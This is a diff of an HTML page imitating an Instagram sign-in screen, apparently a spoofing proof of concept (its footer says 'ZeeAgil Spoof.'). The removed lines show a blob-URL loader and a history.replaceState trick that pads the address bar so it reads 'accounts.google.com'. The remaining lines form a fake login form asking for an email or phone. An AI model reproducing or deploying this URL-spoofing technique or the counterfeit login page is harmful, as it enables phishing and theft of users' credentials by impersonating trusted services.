@@ -1,5 +1,4 @@
-<script>
-var exp = `<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -66,22 +65,16 @@ var exp = `<!DOCTYPE html>
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://www.svgrepo.com/show/343562/instagram-social-media-network-communication-interaction-connection.svg" alt="Google">
+      <img src="https://www.svgrepo.com/show/343562/instagram-social-media-network-communication-interaction-connection.svg">
     </div>
     <h1>Sign in</h1>
     <div>to continue to Instagram</div>
     <div class="input-field">
-      <label for="email">Email or phone</label>
-      <input id="email" type="email" placeholder="">
+      <label>Email or phone</label>
+      <input type="email">
     </div>
     <button class="btn">Next</button>
     <div class="footer">ZeeAgil Spoof.</div>
   </div>
-
-  <script>
-    history.replaceState("", "", "google.com:"+location.protocol+"//accounts.google.com"+Array(1000).join(" ")+"@"+location.host+"/");
-  <\/script>
 </body>
-</html>`;
-location = URL.createObjectURL(new Blob([exp], {type: "text/html"}));
-</script>
+</html>
